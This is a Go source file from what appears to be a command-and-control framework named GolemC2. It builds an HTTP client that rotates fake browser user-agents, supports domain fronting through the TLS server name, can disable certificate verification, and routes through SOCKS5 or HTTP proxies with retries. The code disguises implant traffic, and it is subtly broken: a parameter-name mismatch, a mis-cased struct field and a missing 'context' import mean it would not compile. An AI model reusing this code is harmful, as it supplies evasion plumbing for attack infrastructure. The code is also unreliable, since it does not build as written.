package common

import (
	"crypto/tls"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/DUDLEYDANIEL/GolemC2/pkg/logging"
	"github.com/sirupsen/logrus"
	"golang.org/x/net/proxy"
)

type HTTPClientConfig struct{
	TLSCfg		*tls.Config
	Timeout		time.Duration
	MaxRetries 	int
	ProxyURL 	string
	userAgent	[]string
	FrontDomain string
	InsecureSkipVerify bool
	RNG		*rand.Rand	
}

func DefaultHttpClientConfig( tlscfg *tls.Config, cfg *Config) *HTTPClientConfig{
	userAgent := cfg.userAgent
	if len(userAgent) == 0 {
		userAgent = []string{
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
			"Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
		}
	}

	return &HTTPClientConfig{
		TLSCfg:             tlsCfg,
		Timeout:            cfg.Timeout,
		MaxRetries:         cfg.MaxRetries,
		ProxyURL:           cfg.ProxyURL,
		UserAgent:         userAgent,
		FrontDomain:        cfg.FrontDomain,
		InsecureSkipVerify: cfg.InsecureSkipVerify,
		RNG:                rand.New(rand.NewSource(time.Now().UnixNano())),
	}
} 


func NewTLSClient(cfg *HTTPClientConfig) *http.Client{
	tlsCfg := cfg.TLSCfg
	if tlsCfg == nil {
		tlsCfg = &tls.Config{
			InsecureSkipVerify: cfg.InsecureSkipVerify,
			MinVersion: tls.VersionTLS12,
			MaxVersion: tls.VersionTLS13,
						PreferServerCipherSuites: true,
			CipherSuites: []uint16{
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			},
		}
	}else if cfg.InsecureSkipVerify {
		tlsCfg.InsecureSkipVerify = true
	}

	if cfg.FrontDomain != ""{
		tlsCfg.ServerName = cfg.FrontDomain
	}

	transport := &http.Transport{
		TLSClientConfig: tlsCfg,
		MaxIdleConns: 20,
		MaxIdleConnsPerHost: 5,
		IdleConnTimeout: 30 * time.Second,
		TLSHandshakeTimeout: 10 * time.Second,
		DialContext: (&net.Dialer{
			Timeout: 5*time.Second,
			KeepAlive: 30*time.Second,
		}).DialContext,
	} 

	if cfg.ProxyURL != ""{
		proxyURL,err := url.Parse(cfg.ProxyURL)
		if err != nil {
			logging.Log.WithFields(logrus.Fields{
				"error": err,
				"proxy": cfg.ProxyURL,
			}).Errorf("failed to parse proxy URL")
		}else {
			switch strings.ToLower(proxyURL.Scheme) {
			case "socks5" :
				dialer, err := proxy.SOCKS5("tcp", proxyURL.Host, nil, proxy.Direct)
				if err != nil {
					logging.Log.WithFields(logrus.Fields{
						"error": err,
						"proxy": cfg.ProxyURL,
					}).Error("Failed to create SOCKS5 proxy")
				} else {
					transport.DialContext = func (ctx context.Context, network, addr string) (net.Conn, error){
						return dialer.Dial(network, addr)
					}
				}
			default:
				transport.Proxy = http.ProxyURL(proxyURL)
			}
		}
	}

	return &http.Client{
		Transport: &userAgentTransport{
			Transport: transport,
			userAgent: cfg.userAgent,
			MaxRetries: cfg.MaxRetries,
			RNG: cfg.RNG,
		},
		Timeout: cfg.Timeout,
	}
}


type userAgentTransport struct {
	Transport http.RoundTripper
	userAgent []string
	MaxRetries int
	RNG *rand.Rand
}


func (t *userAgentTransport) RoundTrip(req *http.Request)(*http.Response, error){
	if len(t.userAgent) > 0 {
		req.Header.Set("User-Agent", t.userAgent[t.RNG.Intn(len(t.userAgent))])
	}

	ctx :=  req.Context()
	logging.Log.WithFields(logrus.Fields{
		"url":    req.URL.String(),
		"method": req.Method,
	}).Debug("Attempting HTTP request")


	var resp *http.Response
	var err error

	for i :=0;i<=t.MaxRetries;i++ {
		select {
		case <-ctx.Done():
			logging.Log.WithFields(logrus.Fields{
				"error": err,
				"url": req.URL.String(),
			}).Error("Request Cancelled")
			return nil, ctx.Err()
			default:
		}

		resp, err = t.Transport.RoundTrip(req)
		if err == nil {
			logging.Log.WithFields(logrus.Fields{
				"url":        req.URL.String(),
				"method":     req.Method,
				"status":     resp.StatusCode,
				"attempt":    i + 1,
			}).Info("HTTP request successful")
			return resp, nil
		}

		if !isRetryableError(err, resp) {
			logging.Log.WithFields(logrus.Fields{
				"error":   err,
				"url":     req.URL.String(),
				"attempt": i + 1,
			}).Error("Non-retryable HTTP error")
			return nil, err
		}

		retryDelay := time.Duration(1<<uint(i)) * 100 * time.Millisecond
		logging.Log.WithFields(logrus.Fields{
			"error":      err,
			"url":        req.URL.String(),
			"attempt":    i + 1,
			"retry_delay": retryDelay,
		}).Warn("HTTP request failed, retrying")


		select {
		case <-ctx.Done():
			logging.Log.WithFields(logrus.Fields{
				"error": ctx.Err(),
				"url":   req.URL.String(),
			}).Error("Request canceled during retry")
			return nil, ctx.Err()
		case <-time.After(retryDelay):
		}

	}

	logging.Log.WithFields(logrus.Fields{
		"error": err,
		"url": req.URL.String(),
	}).Error("HTTP request failed after all retries")
	return nil, err
}

func isRetryableError(err error, resp *http.Response) bool{
	if err != nil {
		if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || strings.Contains(err.Error(),"connection refused")){
			return true
		}
		return false
	}


	if resp != nil {
		switch resp.StatusCode{
		case http.StatusTooManyRequests, http.StatusServiceUnavailable, http.StatusGatewayTimeout:
			return true
		}
	}
	return false
}